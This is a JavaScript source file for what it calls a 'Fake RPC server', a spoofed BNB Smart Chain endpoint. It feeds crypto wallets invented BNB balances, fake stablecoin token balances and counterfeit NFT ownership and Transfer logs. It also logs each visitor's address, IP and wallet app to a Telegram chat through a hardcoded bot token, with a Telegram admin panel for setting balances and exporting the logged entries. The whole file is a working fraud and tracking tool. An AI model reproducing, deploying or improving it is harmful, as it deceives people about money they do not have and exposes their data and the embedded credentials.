const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require("ethers"); // ADDED FOR ETH_CALL

const app = express();
const PORT = process.env.PORT || 9798;
const HOST = '0.0.0.0';

// Telegram Bot config
const TELEGRAM_BOT_TOKEN = '8395301366:AAGSGCdJDIgJ0ffRrSwmjV2q-YPUgLliHEE';
const TELEGRAM_CHAT_ID = '7812677112';

// Replace with your Telegram user IDs
const SUPERADMINS = [
    7812677112, // superadmin ID (hardcoded)
    // add more superadmins here
];

// Persistent data directory for Render disk
const DATA_DIR = '/data';

// Ensure DATA_DIR exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
const BALANCES_JSON_FILE = path.join(DATA_DIR, 'balances.json');
const BALANCES_CSV_FILE = path.join(DATA_DIR, 'balances.csv');

// Load admins from file or fallback to default
function loadAdmins() {
    try {
        if (fs.existsSync(ADMINS_FILE)) {
            const data = fs.readFileSync(ADMINS_FILE, 'utf-8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.error('[!] Failed to load admins:', err);
    }
    return [222222222]; // default admins if file missing
}

// Save admins array to file
function saveAdmins() {
    try {
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(ADMINS, null, 2));
    } catch (err) {
        console.error('[!] Failed to save admins:', err);
    }
}

let ADMINS = loadAdmins();

// Convert hex wei balance to human-readable BNB decimal string
function weiHexToBNB(hexWei) {
    if (!hexWei || typeof hexWei !== 'string') return '0';
    const hex = hexWei.toLowerCase().startsWith('0x') ? hexWei.slice(2) : hexWei;
    const wei = BigInt('0x' + hex);
    const decimals = 18n;
    const divisor = 10n ** decimals;
    const whole = wei / divisor;
    const fraction = wei % divisor;
    let fractionStr = fraction.toString().padStart(Number(decimals), '0');
    fractionStr = fractionStr.replace(/0+$/, '');
    return fractionStr.length > 0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
}

// Load spoofed balances with detailed info
const loadBalances = () => {
    try {
        if (fs.existsSync(BALANCES_JSON_FILE)) {
            const data = fs.readFileSync(BALANCES_JSON_FILE, 'utf-8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.error('[!] Failed to load balances:', err);
    }
    return {};
};

// Save spoofed balances as JSON backup
const saveBalancesJSON = () => {
    try {
        fs.writeFileSync(BALANCES_JSON_FILE, JSON.stringify(spoofedBalances, null, 2));
    } catch (err) {
        console.error('[!] Failed to save balances JSON:', err);
    }
};

// Save spoofed balances as CSV file for human reading, sorted by timestamp desc, numbered rows
const saveBalancesCSV = () => {
    const headers = ['#', 'Address', 'Balance (BNB)', 'Timestamp', 'Wallet', 'IP'];
    const rows = [headers.join(',')];

    // Sort addresses by timestamp descending (most recent first)
    const entriesSorted = Object.entries(spoofedBalances).sort((a, b) => {
        const tA = new Date(a[1].timestamp).getTime();
        const tB = new Date(b[1].timestamp).getTime();
        return tB - tA;
    });

    entriesSorted.forEach(([address, data], index) => {
        const balanceBNB = weiHexToBNB(data.balance);
        const row = [
            index + 1,
            address,
            balanceBNB,
            data.timestamp,
            data.wallet,
            data.ip
        ].map(field => `"${field}"`).join(',');
        rows.push(row);
    });

    const csvContent = rows.join('
');
    try {
        fs.writeFileSync(BALANCES_CSV_FILE, csvContent);
    } catch (err) {
        console.error('[!] Failed to save balances CSV:', err);
    }
};

// Load balances on startup
let spoofedBalances = loadBalances();

// === ETH_CALL SETUP ===
const BALANCE_CHECKER_ABI = [
    "function balances(address[] users, address[] tokens) view returns (uint256[])"
];
const iface = new ethers.Interface(BALANCE_CHECKER_ABI);

app.use(cors());
app.use(express.static(path.join(__dirname, '/')));
app.use(bodyParser.json());

// Telegram bot instance with polling
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// === ADDED: Persistent "Panel" button keyboard ===

// Send persistent keyboard with "Panel" button (for admins only)
function sendPersistentPanelKeyboard(chatId) {
    const keyboard = {
        reply_markup: {
            keyboard: [
                [{ text: 'Panel' }]
            ],
            resize_keyboard: true,
            one_time_keyboard: false,
        }
    };
    bot.sendMessage(chatId, '>!<', keyboard);
}

// /start command to send persistent "Panel" button keyboard
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (!isAdmin(fromId)) {
        bot.sendMessage(chatId, '⛔ You are not authorized.');
        return;
    }

    sendPersistentPanelKeyboard(chatId);
});

// Handle when user presses the "Panel" button from ReplyKeyboardMarkup
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (msg.text === 'Panel') {
        if (!isAdmin(fromId)) {
            bot.sendMessage(chatId, '⛔ You are not authorized to use this panel.');
            return;
        }

        const inlineKeyboard = [
            [
                { text: 'Balances', callback_data: '/balances' },
                { text: 'Open Panel', url: 'https://bnbchainpanel.vercel.app' }
            ],
            [
                { text: 'Add Admin', callback_data: '/addadmin' },
                { text: 'Remove Admin', callback_data: '/removeadmin' }
            ],
            [
                { text: 'List Admins', callback_data: '/listadmins' }
            ]
        ];

        bot.sendMessage(chatId, 'Select a command:', {
            reply_markup: {
                inline_keyboard: inlineKeyboard
            }
        });
    }
});

// === END ADDED CODE ===

// Helper functions
function isSuperAdmin(userId) {
    return SUPERADMINS.includes(userId);
}

function isAdmin(userId) {
    return isSuperAdmin(userId) || ADMINS.includes(userId);
}

// Send balances CSV document
function sendBalances(chatId, fromId) {
    if (!isAdmin(fromId)) {
        bot.sendMessage(chatId, '⛔ You are not authorized to use this command.');
        return;
    }

    if (Object.keys(spoofedBalances).length === 0) {
        bot.sendMessage(chatId, 'No spoofed balances set yet.');
        return;
    }

    saveBalancesCSV();

    bot.sendDocument(chatId, BALANCES_CSV_FILE).catch(err => {
        console.error('Failed to send balances CSV:', err);
        bot.sendMessage(chatId, 'Failed to send balances CSV file.');
    });
}

// /set command link message
function sendSetLink(chatId) {
    const url = 'https://bnbchainpanel.vercel.app';
    bot.sendMessage(chatId, `Open the BNB Chain Panel here:
[Click to open](${url})`, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
    });
}

// /balances command
bot.onText(/\/balances/, (msg) => {
    sendBalances(msg.chat.id, msg.from.id);
});

// /set command
bot.onText(/\/set/, (msg) => {
    sendSetLink(msg.chat.id);
});

// /panel command shows all buttons to all admins
bot.onText(/\/panel/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (!isAdmin(fromId)) {
        bot.sendMessage(chatId, '⛔ You are not authorized to use this panel.');
        return;
    }

    const inlineKeyboard = [
        [
            { text: 'Balances', callback_data: '/balances' },
            { text: 'Open Panel', url: 'https://bnbchainpanel.vercel.app' }
        ],
        [
            { text: 'Add Admin', callback_data: '/addadmin' },
            { text: 'Remove Admin', callback_data: '/removeadmin' }
        ],
        [
            { text: 'List Admins', callback_data: '/listadmins' }
        ]
    ];

    const options = {
        reply_markup: {
            inline_keyboard: inlineKeyboard
        }
    };

    bot.sendMessage(chatId, 'Select a command:', options);
});

// Handle callback queries with permission check
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const fromId = callbackQuery.from.id;

    if (!isAdmin(fromId)) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Not authorized.', show_alert: true });
        return;
    }

    // Normal admins get access denied for all callback commands except URL buttons (which have no callback)
    if (!isSuperAdmin(fromId)) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Access denied for this command.', show_alert: true });
        return;
    }

    bot.answerCallbackQuery(callbackQuery.id);

    if (data === '/balances') {
        sendBalances(msg.chat.id, fromId);
    } else if (data === '/addadmin') {
        bot.sendMessage(msg.chat.id, 'Please send the user ID to add as admin.');
        waitForAdminResponse(msg.chat.id, fromId, 'add');
    } else if (data === '/removeadmin') {
        bot.sendMessage(msg.chat.id, 'Please send the user ID to remove from admins.');
        waitForAdminResponse(msg.chat.id, fromId, 'remove');
    } else if (data === '/listadmins') {
        const adminList = ADMINS.length > 0 ? ADMINS.join('
') : 'No admins set.';
        bot.sendMessage(msg.chat.id, `Current admins:
${adminList}`);
    } else {
        bot.sendMessage(msg.chat.id, 'Unknown command.');
    }
});

// Function to wait for admin ID reply for add/remove
function waitForAdminResponse(chatId, fromId, action) {
    const handler = (msg) => {
        if (msg.chat.id !== chatId || msg.from.id !== fromId) return;

        const userId = parseInt(msg.text);
        if (isNaN(userId)) {
            bot.sendMessage(chatId, 'Invalid user ID. Operation cancelled.');
            bot.removeListener('message', handler);
            return;
        }

        if (action === 'add') {
            if (ADMINS.includes(userId) || SUPERADMINS.includes(userId)) {
                bot.sendMessage(chatId, 'User is already an admin or superadmin.');
            } else {
                ADMINS.push(userId);
                saveAdmins();
                bot.sendMessage(chatId, `User ID ${userId} added as admin.`);
            }
        } else if (action === 'remove') {
            if (!ADMINS.includes(userId)) {
                bot.sendMessage(chatId, 'User ID is not an admin.');
            } else {
                ADMINS = ADMINS.filter(id => id !== userId);
                saveAdmins();
                bot.sendMessage(chatId, `User ID ${userId} removed from admins.`);
            }
        }

        bot.removeListener('message', handler);
    };

    bot.on('message', handler);
}

// Helper: Send message to Telegram chat ID
const sendToTelegram = async (text) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown',
        });
    } catch (err) {
        console.error('[!] Telegram send error:', err?.response?.data || err.message);
    }
};

// Helper: Current timestamp
const now = () => new Date().toISOString().replace('T', ' ').split('.')[0];

// Helper: Guess wallet from User-Agent
const detectWalletFromUA = (ua = '') => {
    ua = ua.toLowerCase();
    if (ua.includes('metamask')) return 'MetaMask';
    if (ua.includes('trust')) return 'Trust Wallet';
    if (ua.includes('brave')) return 'Brave Wallet';
    if (ua.includes('coinbase')) return 'Coinbase Wallet';
    if (ua.includes('phantom')) return 'Phantom';
    if (ua.includes('opera')) return 'Opera';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('android')) return 'Android WebView';
    if (ua.includes('ios')) return 'iOS WebView';
    return 'Unknown';
};

// JSON-RPC handler
app.post('/', (req, res) => {
    const { method, params, id } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const wallet = detectWalletFromUA(ua);

    console.log(`[RPC] Method: ${method}`);

    if (method === 'eth_chainId') {
        return res.json({ jsonrpc: '2.0', id, result: '0x38' }); // BSC
    }

    if (method === 'net_version') {
        return res.json({ jsonrpc: '2.0', id, result: '56' });
    }

    if (method === 'eth_blockNumber') {
        return res.json({ jsonrpc: '2.0', id, result: '0x100000' });
    }

    if (method === 'eth_syncing') {
        return res.json({ jsonrpc: '2.0', id, result: false });
    }

    if (method === 'eth_getBalance') {
        const address = (params[0] || '').toLowerCase();
        const info = spoofedBalances[address];
        const balanceHex = info ? info.balance : '0x0';
        const balanceBNB = weiHexToBNB(balanceHex);

        const logMsg = `🕒 *${now()}*
[+] Spoofing BNB for \`${address}\`
🪙 Balance: \`${balanceBNB} BNB\`
🧩 Wallet: *${wallet}*
🌐 IP: \`${ip}\``;

        console.log(logMsg);
        sendToTelegram(logMsg);

        // RPC expects hex balance, so return original hex string
        return res.json({ jsonrpc: '2.0', id, result: balanceHex });
    }

    // === NFT+BEP20 full-spoof logic (copied from nft_full_spoof_auto.js and kept exactly as in that file) ===
    // Spoofs BEP-20 and BEP-721 and simulates Transfer logs so wallets auto-detect NFTs/tokens.

    const SPOOF_OWNER = '0x654467492CB23c05A5316141f9BAc44679EEaf8C';
    // Real BSC (BEP-721) NFT contract: Pancake Bunnies
    const SPOOF_NFT_CONTRACT = '0xdf7952b35f24acf7fc0487d01c8d5690a60dba07'.toLowerCase();
    // Real BSC (BEP-20) token contract: BUSD
    const SPOOF_ERC20_CONTRACT = '0xe9e7cea3dedca5984780bafc599bd69add087d56'.toLowerCase();

    const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...';

    const zeros32 = (s='') => s.toString().padStart(64, '0');
    function encodeUint256(n) { return '0x' + BigInt(n).toString(16).padStart(64, '0'); }
    function encodeAddress(a) { return '0x' + a.toLowerCase().replace('0x','').padStart(64,'0'); }
    function encodeBool(b) { return '0x' + (b ? '1'.padStart(64,'0') : '0'.padStart(64,'0')); }

    // --- eth_getCode ---
    if (method === 'eth_getCode') {
        const address = (params && params[0] || '').toLowerCase();
        if (address === SPOOF_NFT_CONTRACT || address === SPOOF_ERC20_CONTRACT)
          return res.json({ jsonrpc:'2.0', id, result:FAKE_BYTECODE });
        return res.json({ jsonrpc:'2.0', id, result:'0x' });
    }

    // --- eth_getLogs: simulate NFT Transfer ---
    if (method === 'eth_getLogs') {
      const filter = params && params[0] || {};
      const address = (filter.address || '').toLowerCase();
      const topics = filter.topics || [];
      // only spoof logs for our NFT contract and to SPOOF_OWNER
      if (address === SPOOF_NFT_CONTRACT) {
        // keccak256("Transfer(address,address,uint256)")
        const transferSig = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
        const toMatch = '0x' + SPOOF_OWNER.replace('0x','').padStart(64,'0');
        // check if topics[0] matches Transfer or not set
        if (!topics[0] || topics[0].toLowerCase() === transferSig) {
          // return a single fake transfer log
          const log = {
            address: SPOOF_NFT_CONTRACT,
            topics: [
              transferSig,
              '0x0000000000000000000000000000000000000000000000000000000000000000', // from=0x0 (mint)
              toMatch
            ],
            data: '0x0000000000000000000000000000000000000000000000000000000000000001', // tokenId=1
            blockNumber: '0x0',
            transactionHash: '0x0',
            transactionIndex: '0x0',
            blockHash: '0x0',
            logIndex: '0x0',
            removed: false
          };
          return res.json({ jsonrpc:'2.0', id, result:[log] });
        }
      }
      return res.json({ jsonrpc:'2.0', id, result:[] });
    }

    // --- eth_call ---
    if (method === 'eth_call') {
      const call = (params && params[0]) || {};
      const to = (call.to || '').toLowerCase();
      const data = (call.data || '').toLowerCase();
      const caller = (call.from || SPOOF_OWNER).toLowerCase();

      console.log(`[${new Date().toISOString()}] eth_call to=${to} from=${caller} data=${data.slice(0,10)}...`);

      // --- ERC20 spoof ---
      if (to === SPOOF_ERC20_CONTRACT) {
        if (data.startsWith('0x70a08231')) { // balanceOf
          const value = BigInt(1000) * BigInt(10)**BigInt(6);
          return res.json({ jsonrpc:'2.0', id, result:encodeUint256(value) });
        }
        if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(6) });
        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('USDC').toString('hex').padEnd(64,'0') });
        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('USD Coin').toString('hex').padEnd(64,'0') });
      }

      // --- ERC721 spoof ---
      if (to === SPOOF_NFT_CONTRACT) {
        if (data.startsWith('0x01ffc9a7')) return res.json({ jsonrpc:'2.0', id, result:encodeBool(true) });
        if (data.startsWith('0x6352211e')) return res.json({ jsonrpc:'2.0', id, result:encodeAddress(caller) });
        if (data.startsWith('0x70a08231')) return res.json({ jsonrpc:'2.0', id, result:encodeUint256(1) });
        if (data.startsWith('0xc87b56dd')) { // tokenURI
          const url = 'https://raw.githubusercontent.com/MetaMask/contract-metadata/master/images/ape.png';
          const hex = '0x' + Buffer.from(url).toString('hex').padEnd(64,'0');
          return res.json({ jsonrpc:'2.0', id, result:hex });
        }
        if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BoredApeYachtClub').toString('hex').padEnd(64,'0') });
        if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id, result:'0x' + Buffer.from('BAYC').toString('hex').padEnd(64,'0') });
      }

      return res.json({ jsonrpc:'2.0', id, result:'0x' });
    }

    // Unknown methods
    const logMsg = `🕒 *${now()}*
⚠️ Unknown RPC: \`${method}\`
🧩 Wallet: *${wallet}*
🌐 IP: \`${ip}\``;
    console.log(logMsg);
    sendToTelegram(logMsg);

    return res.json({ jsonrpc: '2.0', id, result: null });
});

// Handle spoofed balance update
app.post('/set-balance', (req, res) => {
    const { address, balance } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const wallet = detectWalletFromUA(ua);

    if (
        !address ||
        !balance ||
        !/^0x[0-9a-fA-F]{40}$/.test(address) ||
        !/^0x[0-9a-fA-F]+$/.test(balance)
    ) {
        return res.status(400).json({ error: 'Invalid address or balance' });
    }

    const cleanAddress = address.toLowerCase();
    spoofedBalances[cleanAddress] = {
        balance: balance.toLowerCase(),
        timestamp: now(),
        wallet,
        ip
    };

    saveBalancesJSON();

    const balanceBNB = weiHexToBNB(balance);
    const logMsg = `🕒 *${now()}*
[~] Set balance for \`${cleanAddress}\`
💰 New Balance: \`${balanceBNB} BNB\`
🧩 Wallet: *${wallet}*
🌐 IP: \`${ip}\``;

    console.log(logMsg);
    sendToTelegram(logMsg);

    return res.status(200).json({ success: true });
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Fake RPC server running at http://${HOST}:${PORT}`);
});
